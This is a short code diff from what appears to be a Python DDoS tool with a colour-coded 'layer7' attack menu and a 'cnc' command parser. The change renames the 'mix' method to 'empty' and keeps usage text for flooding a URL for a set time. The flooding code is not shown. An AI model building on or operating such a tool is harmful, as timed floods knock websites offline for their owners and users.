@@ -184,7 +184,7 @@ def layer7():
                \x1b[38;2;0;212;14m╔══════════════╩════════╦══════╩══════════════╗
                \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255mhttps               \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255mcoming soon       \x1b[38;2;0;212;14m║
                \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255mload                \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255mcoming soon       \x1b[38;2;0;212;14m║
-               \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255mmix                 \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255mcoming soon       \x1b[38;2;0;212;14m║
+               \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255mcoming soon         \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255mcoming soon       \x1b[38;2;0;212;14m║
                \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255mcoming soon         \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255mcoming soon       \x1b[38;2;0;212;14m║
                \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255mcoming soon         \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255mcoming soon       \x1b[38;2;0;212;14m║
                \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255mcoming soon         \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255mcoming soon       \x1b[38;2;0;212;14m║
@@ -276,7 +276,7 @@ def main():
                 print('Usage: load <url> <time> ')
                 print('Example: load http://example-cloud.com 60')
 
-        elif "mix" in cnc:
+        elif "empty" in cnc:
             try:
                 url = cnc.split()[1]
                 time = cnc.split()[2]
